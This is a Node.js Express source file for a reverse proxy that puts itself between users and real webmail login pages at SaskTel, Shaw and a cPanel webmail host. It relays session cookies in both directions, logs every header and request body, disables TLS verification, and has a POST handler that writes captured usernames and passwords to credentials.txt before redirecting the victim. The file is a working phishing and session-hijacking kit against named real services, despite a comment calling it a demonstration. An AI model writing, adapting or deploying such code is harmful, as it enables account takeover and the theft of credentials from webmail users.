// proxy-server.js
import express from 'express';
import bodyParser from 'body-parser';
import fs from 'fs';
import { createProxyMiddleware } from 'http-proxy-middleware';

const app = express();

// Middleware to parse URL-encoded bodies (for form submissions)
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Middleware to log all incoming requests with detailed information
app.use((req, res, next) => {
  console.log(`\n[${new Date().toISOString()}] Incoming ${req.method} request to ${req.url}`);
  console.log('Headers:', JSON.stringify(req.headers, null, 2));

  if (req.method === 'POST' || req.method === 'PUT') {
    console.log('Body:', JSON.stringify(req.body, null, 2));
  }

  next();
});

// Function to determine the target URL based on incoming request
function getTargetUrl(req) {
  const { host } = req.headers;

  if (host.includes('sasktel')) {
    return 'https://webmail.sasktel.net';
  } else if (host.includes('expertsinmarketing')) {
    return 'https://expertsinmarketing.com:2096';
  }
  
  // Add more conditions here for other webmails
  // Example:
  // else if (host.includes('otherwebmail')) {
  //   return 'https://otherwebmail.com';
  // }

  // Default target if no specific match found
  return 'https://webmail.shaw.ca/'; // Change this to a valid default URL if needed
}

// Proxy middleware to forward requests based on the target determined
app.use(
  '/',
  createProxyMiddleware({
    changeOrigin: true,
    secure: false, // Disable SSL verification if needed
    timeout: 20000, // Increase timeout to 20 seconds
    proxyTimeout: 20000, // Increase proxy timeout for the connection
    logLevel: 'debug',  // Detailed logging
    router: (req) => {
      const target = getTargetUrl(req);
      console.log(`Routing request to: ${target}`);
      return target;
    },
    onProxyReq: (proxyReq, req, res) => {
      console.log(`Proxying ${req.method} request to: ${proxyReq.path}`);

      // Forward the cookies from the client
      if (req.headers.cookie) {
        proxyReq.setHeader('Cookie', req.headers.cookie);
      }

      // Forward necessary headers
      proxyReq.setHeader('User-Agent', req.headers['user-agent']);
      proxyReq.setHeader('Accept', req.headers['accept']);
      proxyReq.setHeader('Accept-Language', req.headers['accept-language']);
      proxyReq.setHeader('Accept-Encoding', req.headers['accept-encoding']);
      console.log('Forwarded Headers:', proxyReq.getHeaders());
    },
    onProxyRes: (proxyRes, req, res) => {
      console.log(`Received response with status ${proxyRes.statusCode}`);

      // Copy cookies from proxy response to client response
      const setCookies = proxyRes.headers['set-cookie'];
      if (setCookies) {
        res.setHeader('Set-Cookie', setCookies);
      }
    },
    onError: (err, req, res) => {
      console.error(`Proxy encountered an error: ${err.message}`);
      if (res.headersSent) {
        return req.socket.destroy();
      }
      res.writeHead(502, { 'Content-Type': 'text/plain' });
      res.end('Bad gateway error occurred while processing your request.');
    },
  })
);

// Enhanced POST handler to capture login credentials
app.post('*', (req, res) => {
  const { user, pass } = req.body;

  if (user && pass) {
    // Log credentials to a file for demonstration purposes
    console.log(`Captured credentials: User: ${user}, Password: ${pass}`);
    fs.appendFileSync('credentials.txt', `User: ${user}, Password: ${pass}\n`);
    // Redirect to an external site
    res.redirect('https://www.example.com');
  } else {
    console.log('POST request received but no valid credentials found.');
    res.sendStatus(400); // Send a bad request status to indicate missing data
  }
});

// Start the HTTP server for testing
app.listen(3000, () => {
  console.log('Proxy server running on http://localhost:3000');
});
